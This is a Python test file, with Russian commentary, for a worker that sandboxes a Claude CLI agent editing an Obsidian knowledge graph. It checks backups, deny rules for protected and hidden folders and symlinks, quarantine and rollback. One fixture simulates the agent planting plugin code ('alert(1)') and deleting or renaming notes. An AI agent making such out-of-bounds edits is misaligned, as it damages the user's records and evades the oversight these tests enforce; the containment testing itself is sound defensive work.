"""Фоновый разбор никто не проверял, а правки графа шли без бэкапа.

Две находки аудита, обе про то, что происходит ПОСЛЕ запуска облака.

CHR-AUD-004. `Popen` уходил в фон без таймаута и без проверки кода возврата.
Сообщение «Claude запущен фоном» означало ровно одно: процесс стартовал. Если
он падал, упирался в лимит или отвечал обрывком, в папке встречи оставался
пустой или недописанный файл ревизии — с виду настоящий. Человек узнавал об
этом, только открыв лог, то есть обычно никогда.

CHR-AUD-003. В режиме записи модель правила граф напрямую. Бэкап и границы
того, что можно трогать, existовали только в тексте промпта — то есть держались
на послушании модели, тогда как PRIVACY обещает бэкап перед каждой правкой.

Отсюда воркер: он ждёт процесс с таймаутом, проверяет код возврата и то, что
ответ похож на ревизию, публикует файл атомарно — и в режиме записи снимает
бэкап графа до запуска, а после сверяет, что тронуто только разрешённое.

Границы намеренно узкие. Модель дообогащает граф — узлы, ядра, заметки встреч.
Стенограммы, минутки и раздел «## Правки автора» неприкосновенны: это то, что
написал человек или записала машина с его слов, и облаку там делать нечего.
"""
import pathlib
import sys

REPO = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "scripts"))
sys.path.insert(0, str(REPO / "src"))

import cloud_review


def _graph(tmp: pathlib.Path) -> pathlib.Path:
    graph = tmp / "Работа"
    (graph / "Ядра").mkdir(parents=True)
    (graph / "Встречи").mkdir()
    (graph / "Документация" / "Стенограммы встреч").mkdir(parents=True)
    (graph / "Ядра" / "Платёжный провайдер.md").write_text(
        "# Ядро\n## Статус\nРешено\n\n## Правки автора\n\nруками написанное\n",
        encoding="utf-8")
    (graph / "Встречи" / "2026-07-15_1400.md").write_text("# Встреча\n", encoding="utf-8")
    (graph / "Документация" / "Стенограммы встреч" / "2026-07-15_1400.md").write_text(
        "стенограмма\n", encoding="utf-8")
    return graph


def _cloud_worked(graph: pathlib.Path, tmp: pathlib.Path, work) -> tuple:
    """Облако поработало в песочнице — вернуть вердикт переноса и карантин.

    №120: облако больше не пишет в граф. Его cwd — вторая копия, и тест
    обязан изображать именно это: `work(pen)` правит песочницу, а граф
    трогает только перенос. Заодно это проверяет саму изоляцию — сценарий,
    в котором правка «дотянулась» до графа, теперь невоспроизводим.
    """
    qdir = tmp / "q"
    before = cloud_review.snapshot(graph)
    backup = cloud_review.backup_graph(graph, "снимок")
    pen = cloud_review.backup_graph(graph, "песочница")
    work(pen)
    v = cloud_review.apply_from_copy(before, pen, graph, qdir,
                                     backup=backup, valid=True)
    return v, qdir


def test_allowed_paths_cover_the_graph_and_nothing_outside(tmp_path):
    graph = _graph(tmp_path)
    assert cloud_review.may_write(graph / "Ядра" / "Платёжный провайдер.md", graph)
    assert cloud_review.may_write(graph / "Встречи" / "2026-07-15_1400.md", graph)
    # за пределами графа — никогда, даже если путь выглядит похоже
    assert not cloud_review.may_write(tmp_path / "config.yaml", graph)
    assert not cloud_review.may_write(graph.parent / "Дневник" / "2026-07-15.md", graph)


def test_snapshot_and_obsidian_folders_are_off_limits(tmp_path):
    """Скрытые каталоги графа — снимки (.cloud_backup, .forget_backup,
    Ядра/.tier3_backup) и служебное Obsidian: писать туда облаку нельзя
    (аудит DeepSeek 16.08)."""
    graph = _graph(tmp_path)
    for hidden in (graph / cloud_review.BACKUP_DIR / "2026-07-14_0300" / "Ядра" / "Х.md",
                   graph / ".forget_backup" / "2026-07-15_1400" / "Х.md",
                   graph / "Ядра" / ".tier3_backup" / "2026-07-14" / "Х.md",
                   graph / ".obsidian" / "workspace.json"):
        assert not cloud_review.may_write(hidden, graph), hidden


def test_hidden_paths_are_watched_and_restored(tmp_path):
    """Запрет без сверки — не запрет: snapshot и бэкап раньше пропускали
    dot-пути, а `Edit(/**)` их не исключает — правка .obsidian или снимка
    tier3 была невидимой и необратимой (Codex, Critical 22.08)."""
    graph = _graph(tmp_path)
    plugin = graph / ".obsidian" / "plugins" / "x" / "main.js"
    old_core = graph / "Ядра" / ".tier3_backup" / "2026-07-14" / "Старое.md"
    for f, text in ((graph / ".obsidian" / "app.json", "{}\n"),
                    (old_core, "# Старое\nисходник до слияния\n")):
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(text, encoding="utf-8")
    before = cloud_review.snapshot(graph)
    assert str(old_core.resolve()) in before, "снимок не видит скрытые пути"
    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
    assert (backup / "Ядра" / ".tier3_backup" / "2026-07-14" / "Старое.md").exists()
    # исключения: свой же старый снимок внутри графа и живые окна Obsidian
    legacy = graph / cloud_review.BACKUP_DIR / "2026-07-14_0300" / "x.md"
    legacy.parent.mkdir(parents=True); legacy.write_text("x", encoding="utf-8")
    ws = graph / ".obsidian" / "workspace.json"
    ws.write_text("{}", encoding="utf-8")
    enabled = graph / ".obsidian" / "community-plugins.json"
    enabled.write_text("[]", encoding="utf-8")
    now = cloud_review.snapshot(graph)
    assert str(legacy.resolve()) not in now and str(ws.resolve()) not in now
    # состояние Obsidian (app.json) — живое, не сторожим; список включённых
    # плагинов и код плагинов — сторожим
    assert str((graph / ".obsidian" / "app.json").resolve()) not in now
    assert str(enabled.resolve()) in now

    def worked(pen):
        (pen / ".obsidian" / "plugins" / "x").mkdir(parents=True)
        (pen / ".obsidian" / "plugins" / "x" / "main.js").write_text(
            "alert(1)", encoding="utf-8")                      # создан облаком
        (pen / "Ядра" / ".tier3_backup" / "2026-07-14" / "Старое.md").write_text(
            "# Старое\nпереписано облаком\n", encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, worked)
    assert not plugin.exists(), "код плагина перенесён в граф"
    assert ".obsidian/plugins/x/main.js" in v.removed
    assert (qdir / ".obsidian" / "plugins" / "x" / "main.js").read_text(
        encoding="utf-8") == "alert(1)"
    assert old_core.read_text(encoding="utf-8") == "# Старое\nисходник до слияния\n"
    assert "Ядра/.tier3_backup/2026-07-14/Старое.md" in v.reverted


def test_missing_graph_runs_text_only_instead_of_exposing_transcripts(
        tmp_path, monkeypatch):
    """Wiring: edit=true не выдаёт файловые tools fallback-папке."""
    stamp = "2026-07-15_1400"
    transcripts = tmp_path / "transcripts"
    transcripts.mkdir()
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("чужой текст встречи\n", encoding="utf-8")
    rev = transcripts / f"{stamp}_ревизия.md"
    log = tmp_path / "cloud.log"
    captured = {}

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        captured["cwd"] = kwargs["cwd"]
        kwargs["stdout"].write(
            "- **Решение:** оставить граф закрытым\n"
            "- **Поручение:** проверить настройку\n"
            "- **Риск:** файловый доступ не выдавался\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    code = cloud_review.run(stamp, transcript, tmp_path / "missing-graph",
                            rev, log, cfg)

    assert code == 0
    cmd = captured["cmd"]
    assert cmd[cmd.index("--tools") + 1] == ""
    assert "--allowedTools" not in cmd
    assert captured["cwd"] == str(transcripts)
    assert "только текст (граф недоступен)" in log.read_text(encoding="utf-8")


def test_transcripts_inside_the_graph_are_untouchable(tmp_path):
    """Копии стенограмм лежат в графе, но правит их конвейер, а не облако."""
    graph = _graph(tmp_path)
    doc = graph / "Документация" / "Стенограммы встреч" / "2026-07-15_1400.md"
    assert not cloud_review.may_write(doc, graph)


def test_author_section_changes_are_rejected(tmp_path):
    """«## Правки автора» — то, что человек написал руками."""
    graph = _graph(tmp_path)
    core = graph / "Ядра" / "Платёжный провайдер.md"
    before = core.read_text(encoding="utf-8")
    after = before.replace("руками написанное", "переписанное облаком")
    assert cloud_review.author_section_changed(before, after)
    ok = before.replace("Решено", "Решено — ЮPay")
    assert not cloud_review.author_section_changed(before, ok)


def test_snapshot_notices_added_changed_and_untouched(tmp_path):
    graph = _graph(tmp_path)
    before = cloud_review.snapshot(graph)
    (graph / "Ядра" / "Новое.md").write_text("# Новое\n", encoding="utf-8")
    (graph / "Встречи" / "2026-07-15_1400.md").write_text("# Встреча\nправка\n",
                                                          encoding="utf-8")
    changed = cloud_review.changed_since(before, graph)
    names = {p.name for p in changed}
    assert names == {"Новое.md", "2026-07-15_1400.md"}, names


def test_archive_folders_are_untouchable(tmp_path):
    """Саммари и минутки в архиве — та же категория, что копии стенограмм."""
    graph = _graph(tmp_path)
    arch = graph / "Встречи-архив" / "2026-07-15 14-00 — Платёжный провайдер"
    arch.mkdir(parents=True)
    assert not cloud_review.may_write(arch / "Минутки.md", graph)


def test_deleted_file_is_seen_and_restored(tmp_path):
    """Удаление — тоже правка: diff только по живым файлам его не видел."""
    graph = _graph(tmp_path)
    core = graph / "Ядра" / "Платёжный провайдер.md"
    rel = "Ядра/Платёжный провайдер.md"
    v, _ = _cloud_worked(graph, tmp_path,
                         lambda pen: (pen / rel).unlink())
    assert core.exists(), "удаление облака дошло до графа"
    # Удаление НЕ переносится вовсе: у облака нет причин стирать узлы, а
    # «восстановление» и было тем откатом, что унёс соседнюю встречу (№119).
    assert rel in v.deleted and not v.removed and not v.applied


def test_deleting_a_node_without_author_section_is_a_violation(tmp_path):
    """Удаление — нарушение всегда, не только при пропавших «Правках автора».

    У ядер, людей и систем в проде этого раздела нет, и их стирание
    проходило как «правка» и считалось в «правок графа: N» (Sonnet, Codex
    22.08). Переименование — тоже удаление плюс создание: старый файл
    возвращается, новый остаётся, в логе — отдельное слово.
    """
    graph = _graph(tmp_path)
    person = graph / "Люди" / "Иванов.md"
    person.parent.mkdir()
    person.write_text("# Иванов\n- **Роль:** аналитик\n", encoding="utf-8")
    before = cloud_review.snapshot(graph)
    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
    def renamed(pen):                                       # «переименовал»
        (pen / "Люди" / "Иванов.md").rename(pen / "Люди" / "Иванов И.md")

    v, qdir = _cloud_worked(graph, tmp_path, renamed)
    assert person.read_text(encoding="utf-8") == "# Иванов\n- **Роль:** аналитик\n"
    assert v.deleted == ["Люди/Иванов.md"]
    assert "Люди/Иванов И.md" in v.applied, "новое имя не перенесено"
    line = cloud_review._verdict_line(v, qdir)
    assert "облако стёрло — в графе ОСТАВЛЕНО: Люди/Иванов.md" in line


def test_a_new_file_in_the_pipelines_folder_survives_a_valid_report(tmp_path):
    """Артефакт разбора соседней встречи переживает УСПЕШНУЮ ревизию.

    Круг-8, DS Critical: дыру №119 закрыли только в ветке отката, а при
    валидном отчёте новый файл в защищённой папке по-прежнему уезжал в
    карантин. Отчёт облака не перечисляет созданное им, так что «ответ
    валиден» об авторстве не говорит ничего, — а конвейер пишет `_live`,
    `_minutes`, `_hints` и `_разбор` именно туда и замка графа не берёт.
    Успешных ревизий больше, чем провалившихся: дыра была шире исходной.
    """
    graph = _graph(tmp_path)
    artefact = graph / "Документация" / "Стенограммы встреч" / "2026-07-15_1500_Статус_minutes.md"

    # №120 закрывает эту дыру по построению: конвейер пишет в ГРАФ, облако —
    # в песочницу, и перенос ходит только по правкам песочницы. Файл, которого
    # облако не касалось, для переноса просто не существует.
    def worked(pen):
        artefact.write_text("минутки соседней встречи\n", encoding="utf-8")
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            "# Встреча\nобогатило облако\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)

    assert artefact.is_file(), "минутки соседней встречи унесены при валидном отчёте"
    assert artefact.name not in str(v.removed + v.reverted + v.deleted)
    assert v.applied == ["Встречи/2026-07-15_1400.md"]



def test_non_markdown_files_are_covered_too(tmp_path):
    """Граница стережёт граф, а не расширение .md."""
    graph = _graph(tmp_path)
    data = graph / "Документация" / "Стенограммы встреч" / "запись.vtt"
    data.write_text("WEBVTT\n", encoding="utf-8")
    rel = "Документация/Стенограммы встреч/запись.vtt"
    v, _ = _cloud_worked(graph, tmp_path, lambda pen: (pen / rel).write_text(
        "WEBVTT\nоблако дописало\n", encoding="utf-8"))
    assert data.read_text(encoding="utf-8") == "WEBVTT\n", \
        "правка не-markdown файла в защищённой папке перенесена в граф"
    assert rel in v.reverted


def test_invalid_answer_rolls_back_even_allowed_edits(tmp_path, monkeypatch):
    """Без отчёта правки графа — неизвестной степени готовности: слияние
    могло дойти до середины. Код ≠ 0 или обрывок — откат всего, версии
    облака в карантине (Codex, Critical 22.08)."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcripts = tmp_path / "transcripts"; transcripts.mkdir()
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("текст встречи\n", encoding="utf-8")
    rev, log = transcripts / f"{stamp}_ревизия.md", tmp_path / "cloud.log"
    core = graph / "Ядра" / "Платёжный провайдер.md"
    original = core.read_text(encoding="utf-8")
    monkeypatch.setattr(cloud_review, "ROOT", tmp_path / "data")

    class Result:
        returncode = 1

    def fake_run(cmd, **kwargs):
        # №120: облако правит КОПИЮ (cwd подпроцесса), а не живой граф.
        pen = pathlib.Path(kwargs["cwd"])
        (pen / "Ядра" / "Платёжный провайдер.md").write_text(
            original.replace("Решено", "Решено — ЮPay"), encoding="utf-8")
        (pen / "Люди").mkdir(exist_ok=True)
        (pen / "Люди" / "Новый.md").write_text("# Новый\n", encoding="utf-8")
        kwargs["stdout"].write("Ошибка: rate limit\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 1
    # №120: облако работало в копии, поэтому «откат» исчез как класс —
    # настоящий граф не менялся ни на байт, и доказывать это не нужно
    # сложной сверкой. Ядро осталось прежним, созданный узел в граф не попал.
    assert core.read_text(encoding="utf-8") == original, "граф всё-таки тронут"
    assert not (graph / "Люди" / "Новый.md").exists(), (
        "созданный облаком узел просочился в граф при невалидном ответе"
    )
    # А посмотреть, что наработало облако, человек может: правки копии
    # уехали в карантин — иначе они пропали бы с ротацией снимков.
    q = next(cloud_review.quarantine_root(graph).glob(f"{stamp}-*"))   # штамп + время
    assert "ЮPay" in (q / "Ядра" / "Платёжный провайдер.md").read_text(encoding="utf-8")
    assert (q / "Люди" / "Новый.md").is_file()
    text = log.read_text(encoding="utf-8")
    assert "граф не тронут" in text and "правок облака 2" in text


def test_graph_lock_serialises_workers_and_degrades_to_read_only(tmp_path, monkeypatch):
    """Второй воркер того же графа ждёт первого; не дождался — чтение.

    Раньше он ротировал живой снимок соседа, и тот пропускал сверку: любые
    правки проходили без проверки (Codex, Critical 22.08)."""
    import fcntl
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    monkeypatch.setattr(cloud_review, "ROOT", tmp_path / "data")
    with cloud_review.graph_lock(graph, wait=0) as first:
        assert first is True
        with cloud_review.graph_lock(graph, wait=0.2) as second:
            assert second is False
    # замок отпущен вместе с дескриптором — третий берёт сразу
    with cloud_review.graph_lock(graph, wait=0) as third:
        assert third is True

    # а run() под чужим замком уходит на чтение: ни Edit, ни снимка
    transcripts = tmp_path / "transcripts"; transcripts.mkdir()
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("текст встречи\n", encoding="utf-8")
    rev, log = transcripts / f"{stamp}_ревизия.md", tmp_path / "cloud.log"
    captured = {}

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        kwargs["stdout"].write(
            "- **Решение:** оставить граф закрытым\n"
            "- **Поручение:** проверить настройку\n"
            "- **Риск:** файловый доступ не выдавался\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    monkeypatch.setattr(cloud_review, "LOCK_WAIT", 0.2)
    lock_file = cloud_review.backup_root(graph).parent / "cloud.lock"
    lock_file.parent.mkdir(parents=True, exist_ok=True)
    fd = lock_file.open("w")
    fcntl.flock(fd, fcntl.LOCK_EX)
    try:
        cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
        assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 0
    finally:
        fd.close()
    cmd = captured["cmd"]
    assert "Edit" in cmd[cmd.index("--disallowedTools"):], "под чужим замком выдан Edit"
    assert not (cloud_review.backup_root(graph) / stamp).exists()
    assert "только чтение графа" in log.read_text(encoding="utf-8")


def test_quarantine_keeps_only_recent_runs(tmp_path):
    root = tmp_path / "q"
    for s in ("2026-07-01_1000", "2026-07-02_1000", "2026-07-03_1000"):
        (root / s).mkdir(parents=True)
    (root / "cloud.lock").write_text("", encoding="utf-8")
    cloud_review.rotate_quarantine(root, keep=2)
    assert sorted(p.name for p in root.iterdir()) == [
        "2026-07-02_1000", "2026-07-03_1000", "cloud.lock"]


def test_report_must_look_like_a_review(tmp_path):
    """Пустой или обрезанный ответ не должен публиковаться как ревизия."""
    assert not cloud_review.looks_like_report("")
    assert not cloud_review.looks_like_report("   \n\n")
    assert not cloud_review.looks_like_report("Ошибка: rate limit")
    good = "- **Решение:** взяли ЮPay\n- **Поручение:** договор до 22.07\n" * 2
    assert cloud_review.looks_like_report(good)


def test_publish_is_atomic_and_keeps_a_partial_answer(tmp_path):
    """Обрыв не должен оставлять файл-обманку, но и терять текст не надо."""
    rev = tmp_path / "ревизия.md"
    tmp = tmp_path / "ревизия.md.part"
    tmp.write_text("обрывок", encoding="utf-8")
    published = cloud_review.publish(tmp, rev, ok=False)
    assert not published
    assert not rev.exists(), "недоделанная ревизия опубликована как готовая"
    assert (tmp_path / "ревизия.md.partial").exists(), "текст ответа потерян"

    tmp.write_text("- **Решение:** ок\n" * 5, encoding="utf-8")
    assert cloud_review.publish(tmp, rev, ok=True)
    assert rev.read_text(encoding="utf-8").startswith("- **Решение:**")
    assert not tmp.exists()


def test_published_review_reaches_the_archive_and_the_vault(tmp_path, monkeypatch):
    """Ревизия облака публиковалась позже архива и копий в Документацию, а
    повторно их никто не собирал — в read-only режиме она оставалась в
    transcripts/, невидимой ни в Finder-архиве, ни в графе (аудит GLM 17.08)."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    (graph / "Встречи-архив").mkdir()
    (graph / "Документация" / "Стенограммы встреч").mkdir(parents=True, exist_ok=True)
    transcripts = tmp_path / "transcripts"
    transcripts.mkdir()
    transcript = transcripts / f"{stamp}_Платёжный_провайдер.md"
    transcript.write_text("стенограмма\n", encoding="utf-8")
    rev = transcripts / f"{stamp}_Платёжный_провайдер_ревизия_claude.md"
    log = tmp_path / "cloud.log"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        kwargs["stdout"].write("# Ревизия\n\n- **Решение:** ЮPay\n- **Поручение:** договор\n- **Риск:** сроки\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    import meeting_archive
    monkeypatch.setattr(meeting_archive, "_gen_summary", lambda *a, **k: None)  # без локальной модели
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": False}}
    code = cloud_review.run(stamp, transcript, graph, rev, log, cfg)

    assert code == 0 and rev.exists()
    folder = graph / "Встречи-архив" / "2026-07-15 14-00 — Платёжный провайдер"
    assert (folder / "Ревизия Claude.md").exists(), "ревизия не доехала до архива встречи"
    assert (folder / "Стенограмма.md").exists()
    assert (graph / "Документация" / "Стенограммы встреч" / rev.name).exists(), \
        "ревизия не доехала до Документации"
    assert "ревизия доставлена" in log.read_text(encoding="utf-8")


def test_review_of_an_untitled_meeting_lands_in_its_own_folder(tmp_path, monkeypatch):
    """Посекундная встреча без темы: остаток стема «30» — секунды, а не тема
    (ревью 17.08); ревизия названа минутным штампом и в папку кладётся явно."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    (graph / "Встречи-архив").mkdir()
    existing = graph / "Встречи-архив" / "2026-07-15 14-00 — встреча"
    existing.mkdir()
    transcripts = tmp_path / "transcripts"
    transcripts.mkdir()
    transcript = transcripts / f"{stamp}30.md"
    transcript.write_text("стенограмма\n", encoding="utf-8")
    rev = transcripts / f"{stamp}_ревизия_claude.md"
    log = tmp_path / "cloud.log"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        kwargs["stdout"].write("# Ревизия\n\n- **Решение:** да\n- **Поручение:** нет\n- **Риск:** есть\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    import meeting_archive
    monkeypatch.setattr(meeting_archive, "_gen_summary", lambda *a, **k: None)
    code = cloud_review.run(stamp, transcript, graph, rev, log,
                            {"sufler": {"cloud_enrich": True, "cloud_edit_graph": False}})

    assert code == 0
    assert not (graph / "Встречи-архив" / "2026-07-15 14-00 — 30").exists(), "секунды стали темой папки"
    assert (existing / "Ревизия Claude.md").exists(), "ревизия не легла в папку встречи"


def test_symlink_reading_is_denied_in_both_modes(tmp_path):
    """Симлинку закрыто ЧТЕНИЕ, и в режиме чтения тоже.

    Цель симлинка лежит вне графа, `Read(/**)` лексически её накрывает, а
    в read-only режиме deny-правил не было вовсе: граница держалась только
    на резолве путей внутри CLI (живая проверка 26.08: он отклоняет — но
    пояс на своей стороне стоит одну строку). Защищённые папки читать
    по-прежнему можно: закрыта только запись.
    """
    graph = _graph(tmp_path)
    outside = tmp_path / "снаружи"; outside.mkdir()
    (graph / "link_out").symlink_to(outside, target_is_directory=True)
    (graph / "Ядра" / "ссылка.md").symlink_to(outside / "x.md")
    (graph / ".DS_Store").write_text("", encoding="utf-8")

    links = dict(cloud_review.deny_paths(graph, symlinks_only=True))
    assert links == {"link_out": True, "Ядра/ссылка.md": False}, links

    for may_edit in (False, True):
        cmd = cloud_review.graph_updater.cloud_enrich_command(
            {"sufler": {"cloud_enrich": True, "cloud_edit_graph": may_edit}},
            claude_bin="claude", prompt="p", model="m", may_edit=may_edit,
            deny_paths=cloud_review.deny_paths(graph) if may_edit else (),
            symlink_paths=links.items())
        tail = cmd[cmd.index("--disallowedTools"):cmd.index("--permission-mode")]
        assert "Read(/link_out/**)" in tail, (may_edit, tail)
        assert "Read(/Ядра/ссылка.md)" in tail, (may_edit, tail)
        # чтение защищённой папки остаётся: модель обязана понимать граф
        assert "Read(/Встречи-архив/**)" not in tail


def test_deny_paths_close_protected_hidden_and_symlinked_places(tmp_path):
    """Первый слой — правила CLI: защищённые папки, скрытые каталоги и файлы,
    симлинки (rglob симлинк-каталог не обходит, а цель может быть вне графа;
    Codex, Critical круг-1 по #381). Проверено живым запуском 22.08: deny с
    путём под dontAsk отклоняет запись, соседний разрешённый путь пишется."""
    graph = _graph(tmp_path)
    (graph / ".obsidian" / "plugins" / "x").mkdir(parents=True)
    (graph / ".obsidian" / "plugins" / "x" / "main.js").write_text("", encoding="utf-8")
    (graph / "Ядра" / ".tier3_backup").mkdir()
    (graph / ".DS_Store").write_text("", encoding="utf-8")
    outside = tmp_path / "снаружи"; outside.mkdir()
    (graph / "attachments").symlink_to(outside, target_is_directory=True)
    (graph / "Ядра" / "ссылка.md").symlink_to(outside / "x.md")
    denied = dict(cloud_review.deny_paths(graph))
    assert denied == {
        "Документация/Стенограммы встреч": True, "Встречи-архив": True,
        ".DS_Store": False, ".obsidian": True, "attachments": True,
        "Ядра/.tier3_backup": True, "Ядра/ссылка.md": False}, denied
    rules = cloud_review.graph_updater.deny_rules(cloud_review.deny_paths(graph))
    assert "Edit(/.obsidian/**)" in rules and "Edit(/attachments/**)" in rules
    assert "Edit(/Ядра/ссылка.md)" in rules and "Edit(/Встречи-архив/**)" in rules
    cmd = cloud_review.graph_updater.cloud_enrich_command(
        {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}},
        claude_bin="claude", prompt="p", model="m", may_edit=True,
        deny_paths=cloud_review.deny_paths(graph))
    tail = cmd[cmd.index("--disallowedTools"):cmd.index("--permission-mode")]
    assert "Edit(/attachments/**)" in tail and "Edit(/.obsidian/**)" in tail
    # симлинки не входят в снимок: «откат» такого файла правил бы чужое место
    (outside / "x.md").write_text("чужое", encoding="utf-8")
    assert not any("ссылка.md" in k for k in cloud_review.snapshot(graph))


def test_one_broken_file_does_not_stop_the_check(tmp_path, monkeypatch):
    """Ошибка карантина/диска на одном файле — в `failed`, остальные
    сверены; воркер не падает до ротации и не оставляет нарушения базой
    следующего снимка (круг-1 по #381, DS + Codex)."""
    graph = _graph(tmp_path)
    doc = graph / "Документация" / "Стенограммы встреч" / "2026-07-15_1400.md"
    core = graph / "Ядра" / "Платёжный провайдер.md"
    real = cloud_review.quarantine

    def flaky(path, *a, **k):
        if path.name == doc.name:
            raise OSError(28, "No space left on device")
        return real(path, *a, **k)

    monkeypatch.setattr(cloud_review, "quarantine", flaky)

    def worked(pen):
        (pen / "Документация" / "Стенограммы встреч" / doc.name).write_text(
            "переписано", encoding="utf-8")
        (pen / "Ядра" / core.name).write_text(
            "# Ядро\n## Статус\nРешено\n\n## Правки автора\n\nстёрто\n",
            encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, worked)
    assert v.failed == [f"Документация/Стенограммы встреч/{doc.name}"]
    assert f"Ядра/{core.name}" in v.reverted
    assert "ПЕРЕНОС НЕ СМОГ" in cloud_review._verdict_line(v, qdir)


def test_check_runs_even_if_publishing_blows_up(tmp_path, monkeypatch):
    """Исключение после вызова claude (битый stdout, исчезнувший файл) не
    должно обходить сверку: она в finally (круг-1 по #381, Codex Critical)."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcripts = tmp_path / "transcripts"; transcripts.mkdir()
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("текст\n", encoding="utf-8")
    rev, log = transcripts / f"{stamp}_ревизия.md", tmp_path / "cloud.log"
    doc = graph / "Документация" / "Стенограммы встреч" / f"{stamp}.md"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        pen = pathlib.Path(kwargs["cwd"])
        (pen / "Документация" / "Стенограммы встреч" / f"{stamp}.md").write_text(
            "облако переписало стенограмму", encoding="utf-8")
        kwargs["stdout"].write("- **a:** 1\n- **b:** 2\n- **c:** 3 " + "x" * 60 + "\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    monkeypatch.setattr(cloud_review, "publish", lambda *a, **k: 1 / 0)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    import pytest
    with pytest.raises(ZeroDivisionError):
        cloud_review.run(stamp, transcript, graph, rev, log, cfg)
    assert doc.read_text(encoding="utf-8") == "стенограмма\n", (
        "правка облака дошла до графа, хотя публикация упала"
    )
    # Перенос идёт в finally: исключение по дороге не отменяет ни разбор
    # правок, ни запись о них (круг-1 по #381, Codex Critical).
    assert "граф не тронут" in log.read_text(encoding="utf-8")
    assert not (cloud_review.backup_root(graph) / "другой").exists()


def test_worker_without_lock_does_not_deliver_into_the_graph(tmp_path, monkeypatch):
    """Не дождавшийся замка работает на чтение и ревизию в граф не кладёт:
    сосед, который ещё сверяет, принял бы её за правку облака (Codex)."""
    import fcntl
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcripts = tmp_path / "transcripts"; transcripts.mkdir()
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("текст\n", encoding="utf-8")
    rev, log = transcripts / f"{stamp}_ревизия.md", tmp_path / "cloud.log"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        kwargs["stdout"].write("- **Решение:** оставить\n- **Поручение:** проверить\n"
                               "- **Риск:** доступ не выдавался\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    monkeypatch.setattr(cloud_review, "LOCK_WAIT", 0.2)
    lock_file = cloud_review.backup_root(graph).parent / "cloud.lock"
    lock_file.parent.mkdir(parents=True, exist_ok=True)
    with lock_file.open("w") as fd:
        fcntl.flock(fd, fcntl.LOCK_EX)
        cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
        assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == 0
    assert rev.exists()
    assert not (graph / "Документация" / "Стенограммы встреч" / rev.name).exists()
    assert not (graph / "Встречи-архив").exists()


def test_rerun_with_the_same_stamp_starts_from_a_clean_snapshot(tmp_path):
    """Старый снимок того же штампа хранил файлы, которых в графе уже нет, и
    restore воскрешал их (круг-1 по #381, Codex)."""
    graph = _graph(tmp_path)
    gone = graph / "Встречи-архив" / "старое.md"
    gone.parent.mkdir(); gone.write_text("x", encoding="utf-8")
    cloud_review.backup_graph(graph, "2026-07-15_1400")
    gone.unlink()
    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
    assert not (backup / "Встречи-архив" / "старое.md").exists()


def test_text_only_run_does_not_create_an_archive_in_a_missing_graph(tmp_path, monkeypatch):
    """Без графа доставлять некуда: archive создавал папки в несуществующем
    «графе» (Codex, Important круг-1 по #381)."""
    stamp = "2026-07-15_1400"
    transcripts = tmp_path / "transcripts"; transcripts.mkdir()
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("текст\n", encoding="utf-8")
    rev, log = transcripts / f"{stamp}_ревизия.md", tmp_path / "cloud.log"

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        kwargs["stdout"].write("- **Решение:** оставить\n- **Поручение:** проверить\n"
                               "- **Риск:** доступ не выдавался\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    missing = tmp_path / "missing-graph"
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    assert cloud_review.run(stamp, transcript, missing, rev, log, cfg) == 0
    assert rev.exists() and not missing.exists()


def test_entrypoint_hardens_umask():
    """Прямой запуск скрипта (не через graph_updater) тоже обязан закрыть
